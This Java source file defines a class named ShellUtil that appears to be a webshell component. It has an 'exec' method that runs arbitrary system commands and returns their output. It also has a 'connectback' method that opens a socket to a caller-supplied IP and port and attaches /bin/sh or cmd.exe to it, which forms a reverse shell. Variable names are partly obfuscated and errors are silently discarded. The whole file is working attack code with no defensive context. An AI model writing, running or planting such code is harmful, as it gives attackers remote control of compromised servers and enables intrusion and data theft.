import java.io.*;
import java.net.Socket;

public class ShellUtil extends Object{
    public static String run(String methodName, String params, String encoding) {
        String res = "";
        if (methodName.equals("exec")) {
            res = ShellUtil.exec(params, encoding);
        }else if (methodName.equals("connectback")) {
            String ip = params.substring(0, params.indexOf("^"));
            String port = params.substring(params.indexOf("^") + 1);
            res = ShellUtil.connectBack(ip, Integer.parseInt(port));
        }
        else {
            res = "unkown methodName";
        }
        return res;
    }

    public static String exec(String command, String encoding) {
        StringBuffer result = new StringBuffer();
        try {
            BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(command).getInputStream(), encoding));
            String stemp = "";
            while ((stemp = myReader.readLine()) != null) result.append(stemp + "\n");
            myReader.close();
        } catch (Exception e) {
            result.append(e.toString());
        }
        return result.toString();
    }

    public static String connectBack(String ip, int port) {
        class StreamConnector extends Thread {
            InputStream sp;
            OutputStream gh;

            StreamConnector(InputStream sp, OutputStream gh) {
                this.sp = sp;
                this.gh = gh;
            }
            @Override
            public void run() {
                BufferedReader xp = null;
                BufferedWriter ydg = null;
                try {
                    xp = new BufferedReader(new InputStreamReader(this.sp));
                    ydg = new BufferedWriter(new OutputStreamWriter(this.gh));
                    char buffer[] = new char[8192];
                    int length;
                    while ((length = xp.read(buffer, 0, buffer.length)) > 0) {
                        ydg.write(buffer, 0, length);
                        ydg.flush();
                    }
                } catch (Exception e) {}
                try {
                    if (xp != null) {
                        xp.close();
                    }
                    if (ydg != null) {
                        ydg.close();
                    }
                } catch (Exception e) {
                }
            }
        }
        try {
            String sp;
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
                sp = new String("/bin/sh");
            } else {
                sp = new String("cmd.exe");
            }
            Socket sk = new Socket(ip, port);
            Process ps = Runtime.getRuntime().exec(sp);
            (new StreamConnector(ps.getInputStream(), sk.getOutputStream())).start();
            (new StreamConnector(sk.getInputStream(), ps.getOutputStream())).start();
        } catch (Exception e) {
        }
        return "^OK^";
    }
}